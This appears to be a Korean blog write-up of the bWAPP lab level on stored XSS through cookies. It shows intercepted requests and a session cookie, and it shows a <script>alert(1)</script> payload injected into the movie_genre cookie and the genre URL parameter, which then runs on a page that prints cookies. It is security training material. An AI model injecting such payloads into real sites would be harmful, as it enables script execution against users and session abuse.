---
layout: single
title: (bWAPP)Stored (Cookies)
categories: bwapp
tag: [xss,reflected,stored,reflected xss, bee box,stored xss, OWASP TOP 10, OWASP, bwapp, dom xss]
toc: true
author_profile: false
---

![그림 1-1](image.png)
- 좋아하는 영어를 추천하도록 되어 있다.

![그림 1-2](image-1.png)

```
/xss_stored_2.php?genre=action&form=like
```

- 따로 출력되는 문자는 없으며 Cookie 값에 추가되어 전송된다.
- 전송될 때 GET 형식으로 전송되며 GENRE 파라미터와 FORM 파라미터가 함께 전송된다.

```
/bWAPP/xss_stored_2.php?genre=action&form=like
```

```
Cookie: security_level=0; PHPSESSID=557a0ac8ef0ff6391e5a003cfbc3938e; movie_genre=action
```

- 요청헤더를 가로채 Cookie 요청헤더를 보게되면 movie_gennre 라는 쿠기에 선택했던 action이 추가되어 전달 되는 걸 볼 수 있다.
- 또한 URI 의 파라미터인 genre 파라미터값도 동일하게 악성 스크립트로 변조해서 보낸다.
- 파라미터의 값을 쿠키에 넣는것으로 보인다.

![그림 1-3](image-2.png)
- 그 후 세션값을 출력하는 페이지가 존재한다면
- 확인시 전송된 movie_genre 쿠키가 출력 되는걸 알 수 있다.

```
Cookie: security_level=0; PHPSESSID=557a0ac8ef0ff6391e5a003cfbc3938e; movie_genre=<script>alert(1)</script>; top_security=no

/bWAPP/xss_stored_2.php?genre=<script>alert(1)</script>&form=like
```

- 위와 같이 요청헤더를 가로채 cookie 값을 변조하여 movie_genre 쿠키에 악성스크립트를 주입 하게되면 movie_genre 쿠키는 일정 시간동안 악성스크립트를 저장하게 된다.

![그림 1-4](image-3.png)
![그림 1-5](image-4.png)
- 위와 같이 세션값들을 출력 하는 페이지에서 movie_genre 쿠키값을 출력하며 스크립트가 실행되는 걸 확인할 수 있다.